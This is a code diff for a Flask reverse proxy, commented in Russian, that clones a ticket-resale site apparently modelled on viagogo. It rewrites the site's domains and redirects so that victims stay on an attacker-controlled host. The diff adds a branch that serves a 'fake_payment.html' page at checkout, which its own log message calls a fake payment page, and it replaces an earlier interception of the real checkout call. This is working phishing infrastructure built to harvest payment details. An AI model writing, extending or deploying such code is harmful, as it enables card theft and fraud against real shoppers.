@@ -191,44 +191,14 @@ def health():
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
 @app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
 def proxy(path=''):
+    # Логирование каждого запроса для отладки
     print(f"[REQUEST] {request.method} {request.url} -> {path}")
 
-    # --- ПЕРЕХВАТ Initialise ---
-    if '/secure/buy/Initialise' in request.path:
-        print(f"[TRIGGER] Initialise detected, intercepting")
-        target_url = f"https://checkout.viagogo.com/{path}"
-        if request.query_string:
-            qs = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
-            target_url += f"?{qs}"
-        
-        headers = {}
-        for key, value in request.headers.items():
-            if key.lower() not in EXCLUDED_REQUEST_HEADERS:
-                headers[key] = value
-        headers['Host'] = 'checkout.viagogo.com'
-        headers['Origin'] = 'https://checkout.viagogo.com'
-        headers['Referer'] = 'https://checkout.viagogo.com/'
-        headers['Accept-Language'] = request.headers.get('Accept-Language', 'en-US,en;q=0.9')
+    # Если это запрос к фейковой платёжной странице
+    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment'):
+        print(f"[TRIGGER] Checkout detected, serving fake payment page")
+        return render_template('fake_payment.html', host=EXTERNAL_HOST)
 
-        try:
-            resp = session.request(
-                method=request.method,
-                url=target_url,
-                headers=headers,
-                data=request.get_data(),
-                allow_redirects=False,
-                timeout=25,
-                verify=True
-            )
-            content_str = resp.content.decode('utf-8', errors='ignore')
-            content_str = content_str.replace('checkout.viagogo.com', EXTERNAL_HOST)
-            content_str = content_str.replace('/secure/buy/checkout', '/payment-page')
-            return Response(content_str, status=resp.status_code, content_type='application/json')
-        except Exception as e:
-            print(f"[ERROR] Initialise intercept failed: {e}")
-            return flask_redirect(f"https://{EXTERNAL_HOST}/payment-page", code=302)
-
-    # --- ОБЫЧНЫЙ ПРОКСИ ДЛЯ ВСЕХ ОСТАЛЬНЫХ ЗАПРОСОВ ---
     target_url = f"{TARGET_SCHEME}://{TARGET_DOMAIN}/{path}"
     if request.query_string:
         qs = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
@@ -242,7 +212,6 @@ def proxy(path=''):
     headers['Host'] = TARGET_DOMAIN
     headers['Origin'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}'
     headers['Referer'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}/'
-    headers['Accept-Language'] = request.headers.get('Accept-Language', 'en-US,en;q=0.9')
 
     try:
         resp = session.request(
@@ -261,15 +230,25 @@ def proxy(path=''):
     print(f"[RESPONSE] Status: {resp.status_code}, Location: {resp.headers.get('Location', 'none')}")
 
     # Обработка HTTP-редиректов (30x)
-    if resp.status_code in (301, 302, 303, 307, 308, 202):
+    if resp.status_code in (301, 302, 303, 307, 308):
         location = resp.headers.get('Location', '')
         if location:
+            original_location = location
             location = replace_all_domains(location)
-            if EXTERNAL_HOST not in location:
+            # Если Location указывает на наш домен, возвращаем редирект
+            if EXTERNAL_HOST in location:
+                print(f"[REDIRECT] Modified: {original_location} -> {location}")
+                response = flask_redirect(location, code=resp.status_code)
+            else:
+                # Если Location всё ещё внешний, заменяем принудительно
                 location = f"https://{EXTERNAL_HOST}/"
-            print(f"[REDIRECT] -> {location}")
-            return flask_redirect(location, code=302 if resp.status_code == 202 else resp.status_code)
-        return flask_redirect(f"https://{EXTERNAL_HOST}/", code=302)
+                print(f"[REDIRECT] Forced to home: {original_location} -> {location}")
+                response = flask_redirect(location, code=302)
+        else:
+            location = f"https://{EXTERNAL_HOST}/"
+            response = flask_redirect(location, code=302)
+        return response
+
     content_type = resp.headers.get('Content-Type', '')
     content = resp.content
 
